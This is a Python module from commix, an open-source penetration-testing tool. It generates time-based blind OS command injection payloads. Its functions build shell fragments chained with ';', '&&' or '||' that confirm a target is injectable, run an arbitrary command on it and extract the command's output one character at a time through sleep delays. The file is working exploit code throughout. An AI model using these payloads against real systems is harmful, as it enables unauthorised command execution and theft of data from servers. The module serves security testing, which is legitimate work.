#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

"""
  The "time-based" injection technique on Blind OS Command Injection.
  The available "time-based" payloads.
"""

import urllib

# Time-based decision payload (check if host is vulnerable).
def decision(separator,TAG,j,delay,http_request_method):
  if separator == ";" :
    payload = (separator + " "
	      "str=$(echo "+TAG+")" + separator + " "
	      # Find the length of the output.
	      "str1=${#str}" + separator + " "
	      "if [ \"" + str(j) + "\" -ne ${str1} ]" + separator  + " "
	      "then sleep 0" + separator + " "
	      "else sleep " + str(delay) + separator + " "
	      "fi "
	      )
    
  elif separator == "&&" :
    if http_request_method == "POST":
      separator = urllib.quote(separator)
      ampersand = urllib.quote("&")
    else:
      ampersand = "&"
    payload = (ampersand + " " +
	      "sleep 0  " + separator + " "
	      "str=$(echo "+TAG+") " + separator + " "
	      # Find the length of the output.
	      "str1=${#str} " + separator + " "
	      "[ " + str(j) + " -eq ${str1} ] " + separator + " "
	      "sleep " + str(delay) + " "
	      )
    if http_request_method == "POST":
      separator = urllib.unquote(separator)

  elif separator == "||" :
    payload = (separator + " "
	      "[ "+str(j)+" -ne $(echo \""+TAG+"\" | wc -c) ] " + separator + " "
	      "sleep " + str(delay) + " "
	      )  
  else:
    pass
  
  return payload

# Execute shell commands on vulnerable host.
def cmd_execution(separator,cmd,j,delay,http_request_method):
  if separator == ";" :
    payload = (separator + " "
	      "str=$(" + cmd + ")" + separator +
	      "str1=${#str}" + separator +
	      "if [ \"" + str(j) + "\" != ${str1} ]; " +
	      "then sleep 0" + separator +
	      "else sleep " + str(delay) + separator +
	      "fi "
	      )
	      
  if separator == "&&" :
    if http_request_method == "POST":
      separator = urllib.quote(separator)
      ampersand = urllib.quote("&")
    else:
      ampersand = "&"
    payload = (ampersand + " " +
	      "sleep 0  " + separator + " "
	      "str=$(" + cmd + ")  " + separator + " "
	      # Find the length of the output.
	      "str1=${#str}  " + separator + " "
	      "[ " + str(j) + " -eq ${str1} ] " + separator + " "
	      "sleep " + str(delay) + " "
	      )
    if http_request_method == "POST":
      separator = urllib.unquote(separator)
      
  if separator == "||" :
    payload = (separator + " "
	      "[ "+str(j)+" -ne $(" + cmd + " | wc -c) ] " + separator + 
	      "sleep " + str(delay) + " "
	      )
  return payload

# Get the execution ouput, of shell execution.
def get_char(separator,cmd,i,ascii_char,delay,http_request_method):
  if separator == ";" :
    payload = (separator + " "
	      "str=$(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + separator +
	      "if [ \"" + str(ascii_char) + "\" != ${str} ]" + separator +
	      "then sleep 0" + separator +
	      "else sleep " + str(delay) + separator +
	      "fi "
	      )

  if separator == "&&" :
    if http_request_method == "POST":
      separator = urllib.quote(separator)
      ampersand = urllib.quote("&")
    else:
      ampersand = "&"
    payload = (ampersand + " " +
	      "sleep 0  " + separator + " "
	      "str=$(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) " + separator + " "
	      "[ " + str(ascii_char) + " -eq ${str} ] " + separator + " "
	      "sleep " + str(delay) + " "
	      )
    if http_request_method == "POST":
      separator = urllib.unquote(separator)

  if separator == "||" :
    payload = (separator + " "
	      "[ \"" + str(ascii_char) + "\" -ne  $(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator + 
	      "sleep " + str(delay) + " "
	      )		
  return payload
